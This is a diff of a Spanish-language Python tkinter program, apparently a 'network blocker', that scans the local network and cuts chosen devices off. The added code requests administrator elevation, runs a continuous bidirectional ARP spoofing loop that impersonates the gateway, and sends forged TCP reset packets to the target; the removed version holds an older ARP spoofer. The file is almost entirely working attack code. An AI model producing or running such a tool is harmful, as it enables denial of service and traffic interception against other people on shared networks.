@@ -1,200 +1,364 @@
 import tkinter as tk
 from tkinter import scrolledtext, messagebox, Toplevel
-from scapy.all import ARP, Ether, srp, send
+from scapy.all import *
 import threading
 import uuid
 import time
+import subprocess
+import platform
+import os
+import ctypes
+import sys
 
-# Configuración inicial
-ip_puerta_enlace = "192.168.1.1"
-mac_atacante = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
-ataque_en_curso = False
-dispositivos_detectados = []
-dispositivos_bloqueados = []
-escaneo_automatico = True  # Nueva variable para controlar el escaneo automático
-
-def obtener_mac(ip):
-    solicitud_arp = ARP(pdst=ip)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    paquete = ether / solicitud_arp
-    resultado = srp(paquete, timeout=2, verbose=0)[0]
-    for enviado, recibido in resultado:
-        return recibido.hwsrc
-    return None
-
-def escanear_red():
-    global dispositivos_detectados
-    widget_salida.insert(tk.END, "\nIniciando escaneo de red...\n")
-    rango_ip = "192.168.1.0/24"
-    
-    solicitud_arp = ARP(pdst=rango_ip)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    paquete = ether / solicitud_arp
-    
+# Verificar privilegios de administrador
+def is_admin():
     try:
-        resultado = srp(paquete, timeout=3, verbose=0)[0]
-        widget_salida.insert(tk.END, f"Dispositivos encontrados: {len(resultado)}\n")
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if not is_admin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
+    sys.exit(0)
+
+class NetworkBlocker:
+    def __init__(self):
+        self.ip_puerta_enlace = "192.168.1.1"
+        self.mac_atacante = get_if_hwaddr(conf.iface)
+        self.ataque_en_curso = False
+        self.dispositivos_detectados = []
+        self.dispositivos_bloqueados = []
+        self.escaneo_automatico = True
+        self.hilos_ataque = {}
+
+    def obtener_mac(self, ip):
+        try:
+            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
+            for s, r in ans:
+                return r[Ether].src
+            return None
+        except Exception as e:
+            print(f"Error obteniendo MAC: {e}")
+            return None
+
+    def escanear_red(self):
+        try:
+            # Usar conf.route para obtener la interfaz y la red actual
+            for net, msk, gw, iface, addr, metric in conf.route.routes:
+                if gw != '0.0.0.0' and addr != '0.0.0.0':  # Encontrar la gateway por defecto
+                    self.ip_puerta_enlace = gw
+                    network = f"{addr}/{msk}"
+                    break
+            
+            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=False)
+            
+            nuevos_dispositivos = []
+            for s, r in ans:
+                if r[ARP].psrc != self.ip_puerta_enlace:
+                    # Realizar ping para obtener TTL
+                    resp = sr1(IP(dst=r[ARP].psrc)/ICMP(), timeout=1, verbose=False)
+                    ttl = resp[IP].ttl if resp else 0
+                    
+                    sistema_operativo = "Desconocido"
+                    if ttl >= 128:
+                        sistema_operativo = "Windows"
+                    elif ttl >= 64:
+                        sistema_operativo = "Linux/Android"
+                    elif ttl >= 255:
+                        sistema_operativo = "Cisco/Red"
+                    
+                    dispositivo = {
+                        "ip": r[ARP].psrc,
+                        "mac": r[ARP].hwsrc,
+                        "ttl": ttl,
+                        "sistema_operativo": sistema_operativo
+                    }
+                    
+                    if not any(d['ip'] == dispositivo['ip'] for d in self.dispositivos_bloqueados):
+                        nuevos_dispositivos.append(dispositivo)
+            
+            self.dispositivos_detectados = nuevos_dispositivos
+            return True
+        except Exception as e:
+            print(f"Error en escaneo: {e}")
+            return False
+
+    def enviar_paquetes_bloqueo(self, ip_objetivo, mac_objetivo):
+        try:
+            # Obtener MAC real del gateway
+            mac_gateway = self.obtener_mac(self.ip_puerta_enlace)
+            if not mac_gateway:
+                print("No se pudo obtener MAC del gateway")
+                return
+
+            while True:
+                if not self.ataque_en_curso:
+                    break
+                
+                # ARP Spoofing bidireccional
+                send(ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo,
+                        psrc=self.ip_puerta_enlace, hwsrc=self.mac_atacante), verbose=False)
+                send(ARP(op=2, pdst=self.ip_puerta_enlace, hwdst=mac_gateway,
+                        psrc=ip_objetivo, hwsrc=self.mac_atacante), verbose=False)
+                
+                # TCP RST a puertos comunes
+                for port in [80, 443, 53]:
+                    send(IP(src=self.ip_puerta_enlace, dst=ip_objetivo)/
+                         TCP(sport=port, dport=range(1000,65535), flags="R"), verbose=False)
+                
+                time.sleep(0.2)
+
+        except Exception as e:
+            print(f"Error en bloqueo: {e}")
+
+    def bloquear_dispositivo(self, ip_objetivo):
+        try:
+            mac_objetivo = self.obtener_mac(ip_objetivo)
+            if not mac_objetivo:
+                return False
+
+            self.configurar_firewall(ip_objetivo)
+            
+            self.ataque_en_curso = True
+            hilo = threading.Thread(
+                target=self.enviar_paquetes_bloqueo,
+                args=(ip_objetivo, mac_objetivo),
+                daemon=True
+            )
+            self.hilos_ataque[ip_objetivo] = hilo
+            hilo.start()
+            
+            return True
+        except Exception as e:
+            print(f"Error al bloquear: {e}")
+            return False
+
+    def desbloquear_dispositivo(self, ip_objetivo):
+        try:
+            # Detener el ataque
+            self.ataque_en_curso = False
+            if ip_objetivo in self.hilos_ataque:
+                del self.hilos_ataque[ip_objetivo]
+
+            # Restaurar ARP
+            mac_objetivo = self.obtener_mac(ip_objetivo)
+            mac_gateway = self.obtener_mac(self.ip_puerta_enlace)
+            
+            if mac_objetivo and mac_gateway:
+                for _ in range(5):
+                    send(ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo,
+                           psrc=self.ip_puerta_enlace, hwsrc=mac_gateway), verbose=False)
+                    send(ARP(op=2, pdst=self.ip_puerta_enlace, hwdst=mac_gateway,
+                           psrc=ip_objetivo, hwsrc=mac_objetivo), verbose=False)
+                    time.sleep(0.2)
+
+            # Eliminar reglas de firewall
+            self.eliminar_reglas_firewall(ip_objetivo)
+            return True
+        except Exception as e:
+            print(f"Error al desbloquear: {e}")
+            return False
+
+    def configurar_firewall(self, ip_objetivo):
+        try:
+            if platform.system().lower() == "windows":
+                subprocess.run([
+                    "netsh", "advfirewall", "firewall", "add", "rule",
+                    f"name=BlockIP_{ip_objetivo}", "dir=out", "action=block",
+                    f"remoteip={ip_objetivo}"
+                ], check=True)
+                subprocess.run([
+                    "netsh", "advfirewall", "firewall", "add", "rule",
+                    f"name=BlockIP_{ip_objetivo}_in", "dir=in", "action=block",
+                    f"remoteip={ip_objetivo}"
+                ], check=True)
+        except Exception as e:
+            print(f"Error configurando firewall: {e}")
+
+    def eliminar_reglas_firewall(self, ip_objetivo):
+        try:
+            if platform.system().lower() == "windows":
+                subprocess.run([
+                    "netsh", "advfirewall", "firewall", "delete", "rule",
+                    f"name=BlockIP_{ip_objetivo}"
+                ], check=True)
+                subprocess.run([
+                    "netsh", "advfirewall", "firewall", "delete", "rule",
+                    f"name=BlockIP_{ip_objetivo}_in"
+                ], check=True)
+        except Exception as e:
+            print(f"Error eliminando reglas firewall: {e}")
+
+class NetworkBlockerGUI:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Bloqueador de Red Avanzado")
+        self.root.geometry("800x600")
         
-        nuevos_dispositivos = []
-        for enviado, recibido in resultado:
-            dispositivo = {"ip": recibido.psrc, "mac": recibido.hwsrc}
-            nuevos_dispositivos.append(dispositivo)
+        self.blocker = NetworkBlocker()
+        self.setup_gui()
+        self.iniciar_escaneo_automatico()
+
+    def setup_gui(self):
+        main_frame = tk.Frame(self.root, padx=10, pady=10)
+        main_frame.pack(fill=tk.BOTH, expand=True)
+
+        # Frame de control superior
+        control_frame = tk.Frame(main_frame)
+        control_frame.pack(fill=tk.X, pady=(0, 10))
+
+        # Botones de control
+        self.btn_scan = tk.Button(control_frame, text="Escanear Ahora", 
+                                command=self.escanear_manual,
+                                bg="#4CAF50", fg="white")
+        self.btn_scan.pack(side=tk.LEFT, expand=True, padx=5)
+
+        self.btn_auto = tk.Button(control_frame, text="Auto-Escaneo: ON",
+                                command=self.toggle_auto_scan,
+                                bg="#2196F3", fg="white")
+        self.btn_auto.pack(side=tk.LEFT, expand=True, padx=5)
+
+        # Lista de dispositivos
+        tk.Label(main_frame, text="Dispositivos detectados:").pack(anchor=tk.W)
+        self.lista_dispositivos = tk.Listbox(main_frame, height=10)
+        self.lista_dispositivos.pack(fill=tk.X, pady=(0, 10))
+
+        # Frame de botones de acción
+        action_frame = tk.Frame(main_frame)
+        action_frame.pack(fill=tk.X, pady=(0, 10))
+
+        tk.Button(action_frame, text="Bloquear Dispositivo",
+                 command=self.bloquear_seleccionado,
+                 bg="#f44336", fg="white").pack(side=tk.LEFT, expand=True, padx=5)
+
+        tk.Button(action_frame, text="Ver Bloqueados",
+                 command=self.mostrar_bloqueados,
+                 bg="#9C27B0", fg="white").pack(side=tk.LEFT, expand=True, padx=5)
+
+        # Área de logs
+        tk.Label(main_frame, text="Registro de eventos:").pack(anchor=tk.W)
+        self.log_area = scrolledtext.ScrolledText(main_frame, height=10)
+        self.log_area.pack(fill=tk.BOTH, expand=True)
+
+    def log(self, mensaje):
+        self.log_area.insert(tk.END, f"{mensaje}\n")
+        self.log_area.see(tk.END)
+
+    def actualizar_lista_dispositivos(self):
+        self.lista_dispositivos.delete(0, tk.END)
+        for dispositivo in self.blocker.dispositivos_detectados:
+            self.lista_dispositivos.insert(tk.END, 
+                f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']} - SO: {dispositivo['sistema_operativo']}")
+
+    def escanear_manual(self):
+        self.log("Iniciando escaneo manual...")
+        if self.blocker.escanear_red():
+            self.actualizar_lista_dispositivos()
+            self.log("Escaneo completado.")
+        else:
+            self.log("Error durante el escaneo.")
+
+    def toggle_auto_scan(self):
+        self.blocker.escaneo_automatico = not self.blocker.escaneo_automatico
+        if self.blocker.escaneo_automatico:
+            self.btn_auto.config(text="Auto-Escaneo: ON", bg="#2196F3")
+            self.log("Auto-escaneo activado")
+        else:
+            self.btn_auto.config(text="Auto-Escaneo: OFF", bg="#9E9E9E")
+            self.log("Auto-escaneo desactivado")
+
+    def iniciar_escaneo_automatico(self):
+        def escaneo_loop():
+            while True:
+                if self.blocker.escaneo_automatico:
+                    if self.blocker.escanear_red():
+                        self.root.after(0, self.actualizar_lista_dispositivos)
+                time.sleep(30)
+
+        threading.Thread(target=escaneo_loop, daemon=True).start()
+
+    def bloquear_seleccionado(self):
+        seleccion = self.lista_dispositivos.curselection()
+        if not seleccion:
+            messagebox.showwarning("Error", "Seleccione un dispositivo primero")
+            return
+
+        dispositivo = self.blocker.dispositivos_detectados[seleccion[0]]
+        if self.blocker.bloquear_dispositivo(dispositivo["ip"]):
+            self.blocker.dispositivos_bloqueados.append(dispositivo)
+            self.blocker.dispositivos_detectados.remove(dispositivo)
+            self.actualizar_lista_dispositivos()
+            self.log(f"Dispositivo {dispositivo['ip']} bloqueado exitosamente")
+            if hasattr(self, 'lista_bloqueados'):
+                self.actualizar_lista_bloqueados()
+        else:
+            self.log(f"Error al bloquear dispositivo {dispositivo['ip']}")
+
+    def mostrar_bloqueados(self):
+        ventana_bloqueados = Toplevel(self.root)
+        ventana_bloqueados.title("Dispositivos Bloqueados")
+        ventana_bloqueados.geometry("400x500")
+
+        tk.Label(ventana_bloqueados, text="Dispositivos bloqueados:").pack(pady=5)
         
-        # Comparar con la lista anterior para detectar cambios
-        if dispositivos_detectados != nuevos_dispositivos:
-            dispositivos_detectados = nuevos_dispositivos
-            widget_salida.insert(tk.END, "¡Cambios detectados en la red!\n")
-            for disp in dispositivos_detectados:
-                widget_salida.insert(tk.END, f"IP: {disp['ip']} - MAC: {disp['mac']}\n")
+        lista_bloqueados = tk.Listbox(ventana_bloqueados, height=15)
+        lista_bloqueados.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        # Actualizar lista de bloqueados
+        for dispositivo in self.blocker.dispositivos_bloqueados:
+            lista_bloqueados.insert(tk.END,
+                f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']} - SO: {dispositivo['sistema_operativo']}")
+
+        # Botón de desbloqueo
+        def desbloquear():
+            seleccion = lista_bloqueados.curselection()
+            if not seleccion:
+                messagebox.showwarning("Error", "Seleccione un dispositivo primero")
+                return
+
+            dispositivo = self.blocker.dispositivos_bloqueados[seleccion[0]]
+            if self.blocker.desbloquear_dispositivo(dispositivo["ip"]):
+                self.blocker.dispositivos_bloqueados.remove(dispositivo)
+                lista_bloqueados.delete(seleccion[0])
+                self.log(f"Dispositivo {dispositivo['ip']} desbloqueado exitosamente")
+                self.escanear_manual()
+            else:
+                self.log(f"Error al desbloquear dispositivo {dispositivo['ip']}")
+
+        tk.Button(ventana_bloqueados, text="Desbloquear Seleccionado",
+                 command=desbloquear,
+                 bg="#FF9800", fg="white").pack(pady=10)
+
+    def run(self):
+        self.root.mainloop()
+
+if __name__ == "__main__":
+    try:
+        if platform.system().lower() == "windows":
+            if not is_admin():
+                messagebox.showerror("Error", "Este programa requiere privilegios de administrador")
+                sys.exit(1)
+        else:  # Linux/Unix
+            if os.geteuid() != 0:
+                messagebox.showerror("Error", "Este programa requiere privilegios de root (sudo)")
+                sys.exit(1)
+
+        root = tk.Tk()
+        # Eliminamos la línea problemática del iconbitmap
         
-        actualizar_lista_dispositivos()
+        # Establecer tema oscuro
+        root.configure(bg='#2b2b2b')
+        style = {
+            'bg': '#2b2b2b',
+            'fg': 'white',
+            'button': {'bg': '#444444', 'fg': 'white'},
+            'listbox': {'bg': '#333333', 'fg': 'white'},
+            'text': {'bg': '#333333', 'fg': 'white'}
+        }
+
+        app = NetworkBlockerGUI(root)
+        app.run()
+
     except Exception as e:
-        widget_salida.insert(tk.END, f"Error durante el escaneo: {str(e)}\n")
-    
-    widget_salida.see(tk.END)
-
-def escaneo_periodico():
-    while True:
-        if escaneo_automatico:
-            escanear_red()
-        time.sleep(30)  # Espera 30 segundos antes del próximo escaneo
-
-def actualizar_lista_dispositivos():
-    lista_dispositivos.delete(0, tk.END)
-    for dispositivo in dispositivos_detectados:
-        lista_dispositivos.insert(tk.END, f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']}")
-
-def actualizar_lista_bloqueados():
-    lista_bloqueados.delete(0, tk.END)
-    for dispositivo in dispositivos_bloqueados:
-        lista_bloqueados.insert(tk.END, f"IP: {dispositivo['ip']} - MAC: {dispositivo['mac']}")
-
-def spoofing_arp(ip_objetivo, mac_objetivo):
-    respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
-    respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)
-
-    while ataque_en_curso:
-        send(respuesta_arp_objetivo, verbose=0)
-        send(respuesta_arp_puerta, verbose=0)
-        time.sleep(2)
-
-def iniciar_spoofing():
-    global ataque_en_curso
-    ataque_en_curso = True
-    for dispositivo in dispositivos_bloqueados:
-        ip_objetivo = dispositivo["ip"]
-        mac_objetivo = dispositivo["mac"]
-        hilo = threading.Thread(target=spoofing_arp, args=(ip_objetivo, mac_objetivo), daemon=True)
-        hilo.start()
-
-def detener_spoofing():
-    global ataque_en_curso
-    ataque_en_curso = False
-    widget_salida.insert(tk.END, "Ataque cancelado para todos los dispositivos bloqueados.\n")
-    widget_salida.see(tk.END)
-
-def bloquear_dispositivo():
-    ip_objetivo = obtener_ip_seleccionada(lista_dispositivos, dispositivos_detectados)
-    if ip_objetivo:
-        dispositivo = next((d for d in dispositivos_detectados if d["ip"] == ip_objetivo), None)
-        if dispositivo and dispositivo not in dispositivos_bloqueados:
-            dispositivos_bloqueados.append(dispositivo)
-            actualizar_lista_bloqueados()
-            widget_salida.insert(tk.END, f"Dispositivo {ip_objetivo} agregado a la lista de bloqueados.\n")
-
-def desbloquear_dispositivo():
-    ip_objetivo = obtener_ip_seleccionada(lista_bloqueados, dispositivos_bloqueados)
-    if ip_objetivo:
-        dispositivo = next((d for d in dispositivos_bloqueados if d["ip"] == ip_objetivo), None)
-        if dispositivo:
-            dispositivos_bloqueados.remove(dispositivo)
-            restaurar_conexion(ip_objetivo)
-            actualizar_lista_bloqueados()
-            widget_salida.insert(tk.END, f"Dispositivo {ip_objetivo} eliminado de la lista de bloqueados.\n")
-
-def restaurar_conexion(ip_objetivo):
-    mac_objetivo = obtener_mac(ip_objetivo)
-    mac_puerta = obtener_mac(ip_puerta_enlace)
-    if mac_objetivo and mac_puerta:
-        respuesta_arp_objetivo = ARP(pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta, op=2)
-        respuesta_arp_puerta = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_objetivo, op=2)
-        send(respuesta_arp_objetivo, count=5, verbose=0)
-        send(respuesta_arp_puerta, count=5, verbose=0)
-
-def toggle_escaneo_automatico():
-    global escaneo_automatico
-    escaneo_automatico = not escaneo_automatico
-    if escaneo_automatico:
-        btn_auto_scan.config(text="Detener Auto-Escaneo", bg="#f44336")
-        widget_salida.insert(tk.END, "Escaneo automático activado\n")
-    else:
-        btn_auto_scan.config(text="Iniciar Auto-Escaneo", bg="#4CAF50")
-        widget_salida.insert(tk.END, "Escaneo automático desactivado\n")
-    widget_salida.see(tk.END)
-
-def obtener_ip_seleccionada(lista, dispositivos):
-    seleccion = lista.curselection()
-    if seleccion:
-        return dispositivos[seleccion[0]]["ip"]
-    else:
-        messagebox.showwarning("Selección necesaria", "Seleccione un dispositivo de la lista.")
-        return None
-
-# Crear la ventana principal
-ventana = tk.Tk()
-ventana.title("Analizador de Red")
-ventana.geometry("600x600")
-
-# Frame principal con padding
-frame_principal = tk.Frame(ventana, padx=10, pady=10)
-frame_principal.pack(fill=tk.BOTH, expand=True)
-
-# Frame para los botones de escaneo
-frame_escaneo = tk.Frame(frame_principal)
-frame_escaneo.pack(fill=tk.X, pady=(0, 5))
-
-# Botones de escaneo
-tk.Button(frame_escaneo, text="Escanear Ahora", command=escanear_red, 
-          bg="#4CAF50", fg="white", pady=5).pack(side=tk.LEFT, expand=True, padx=2)
-btn_auto_scan = tk.Button(frame_escaneo, text="Detener Auto-Escaneo", command=toggle_escaneo_automatico,
-                         bg="#f44336", fg="white", pady=5)
-btn_auto_scan.pack(side=tk.LEFT, expand=True, padx=2)
-
-# Lista de dispositivos detectados
-tk.Label(frame_principal, text="Dispositivos detectados:", anchor="w").pack(fill=tk.X, pady=(5, 0))
-lista_dispositivos = tk.Listbox(frame_principal, width=50, height=10)
-lista_dispositivos.pack(fill=tk.X, pady=(0, 5))
-
-# Botones para bloquear y desbloquear
-tk.Button(frame_principal, text="Bloquear Dispositivo", command=bloquear_dispositivo, bg="#2196F3", fg="white").pack(fill=tk.X, pady=2)
-tk.Button(frame_principal, text="Desbloquear Dispositivo", command=desbloquear_dispositivo, bg="#FF9800", fg="white").pack(fill=tk.X, pady=2)
-
-# Ventana de dispositivos bloqueados
-def abrir_ventana_bloqueados():
-    ventana_bloqueados = Toplevel(ventana)
-    ventana_bloqueados.title("Dispositivos Bloqueados")
-    ventana_bloqueados.geometry("400x400")
-    tk.Label(ventana_bloqueados, text="Lista de Dispositivos Bloqueados:", anchor="w").pack(fill=tk.X)
-    
-    global lista_bloqueados
-    lista_bloqueados = tk.Listbox(ventana_bloqueados, width=50, height=15)
-    lista_bloqueados.pack(fill=tk.BOTH, expand=True)
-    actualizar_lista_bloqueados()
-
-# Botón para abrir la ventana de dispositivos bloqueados
-tk.Button(frame_principal, text="Ver Dispositivos Bloqueados", command=abrir_ventana_bloqueados, bg="#FFC107", fg="black").pack(fill=tk.X, pady=5)
-
-# Área de salida de eventos
-tk.Label(frame_principal, text="Registro de eventos:", anchor="w").pack(fill=tk.X, pady=(5, 0))
-widget_salida = scrolledtext.ScrolledText(frame_principal, width=60, height=10)
-widget_salida.pack(fill=tk.BOTH, expand=True)
-
-# Iniciar el hilo de escaneo automático
-hilo_escaneo = threading.Thread(target=escaneo_periodico, daemon=True)
-hilo_escaneo.start()
-
-# Realizar el primer escaneo al iniciar
-escanear_red()
-
-# Iniciar el loop principal
-ventana.mainloop()
+        messagebox.showerror("Error", f"Error al iniciar la aplicación: {str(e)}")
+        sys.exit(1)
